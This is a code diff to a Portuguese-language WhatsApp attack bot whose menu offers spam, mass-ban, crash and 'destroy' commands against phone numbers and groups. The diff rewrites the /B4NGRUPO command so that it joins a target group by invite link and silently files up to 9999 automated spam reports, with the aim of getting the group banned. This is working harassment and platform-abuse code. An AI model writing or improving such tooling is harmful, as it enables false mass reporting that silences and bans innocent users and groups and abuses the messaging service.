@@ -194,7 +194,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `╠━━━⧼ATAQUES & AÇÕES⧽\n` +
                     `> /SP4M <número> <qtd>\n` +
                     `> /B4N <número> <qtd>\n` +
-                    `> /B4NGRUPO <link>\n` +
+                    `> /B4NGRUPO <link> [quantidade]\n` +
                     `> /travgropo <número> <qtd>\n` +
                     `> /destruir <número> <qtd>\n` +
                     `╠━━━⧼𝗚𝗘𝗦𝗧𝗔̃𝗢 & UTILITÁRIOS⧽\n` +
@@ -342,7 +342,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias nativas silenciosas (sem mandar mensagem) para \`${alvoNum}\` (${quantidade} ciclos)...` });
+                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias nativas silenciosas para \`${alvoNum}\` (${quantidade} ciclos)...` });
 
                 for (let i = 1; i <= quantidade; i++) {
                     try {
@@ -360,10 +360,12 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias nativas /B4N para \`${alvoNum}\` concluído!` });
             }
             else if (texto.startsWith('/B4NGRUPO ')) {
-                const linkGrupo = texto.replace('/B4NGRUPO', '').trim();
+                const partesArgs = texto.replace('/B4NGRUPO', '').trim().split(' ');
+                const linkGrupo = partesArgs[0];
+                const quantidadeDenuncias = parseInt(partesArgs[1]) || 9999;
                 
                 if (!linkGrupo || !linkGrupo.includes('chat.whatsapp.com')) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4NGRUPO <link_do_convite>`' });
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4NGRUPO <link_do_convite> [quantidade]`' });
                     return;
                 }
 
@@ -374,20 +376,29 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
 
                 const codigoConvite = matchCode[1];
-                await waSock.sendMessage(remoteJid, { text: `🔄 Tentando entrar no grupo via convite...` });
+                await waSock.sendMessage(remoteJid, { text: `🔄 Tentando entrar no grupo alvo...` });
 
                 try {
                     const idGrupo = await waSock.groupAcceptInvite(codigoConvite);
-                    await waSock.sendMessage(remoteJid, { text: `✅ Entrou no grupo com sucesso! (\`${idGrupo}\`). Iniciando disparos...` });
+                    await waSock.sendMessage(remoteJid, { text: `✅ Entrou no grupo com sucesso! (\`${idGrupo}\`). Disparando ${quantidadeDenuncias} denúncias nativas silenciosas (sem mandar mensagens)...` });
 
-                    for (let i = 1; i <= 15; i++) {
-                        await waSock.sendMessage(idGrupo, { text: `🚨 [ZRX-GROUP ATTACK #${i}/15] 🚨\nGrupo sob invasão e derrubada!` });
-                        await delay(1200);
+                    for (let i = 1; i <= quantidadeDenuncias; i++) {
+                        try {
+                            await waSock.chatModify({
+                                reportSpam: true,
+                                delete: true,
+                                spam: true
+                            }, idGrupo, {
+                                fromMe: false,
+                                remoteJid: idGrupo
+                            });
+                            await delay(300); // Velocidade otimizada para grande volume
+                        } catch (e) {}
                     }
 
-                    await waSock.sendMessage(remoteJid, { text: `✅ Ataque ao grupo concluído!` });
+                    await waSock.sendMessage(remoteJid, { text: `🔥 Ataque de denúncias nativas ao grupo concluído (${quantidadeDenuncias} ciclos)!` });
                 } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: `❌ Erro ao interagir com o grupo.` });
+                    await waSock.sendMessage(remoteJid, { text: `❌ Erro ao entrar ou processar o grupo.` });
                 }
             }
             else if (texto.startsWith('/travgropo')) {
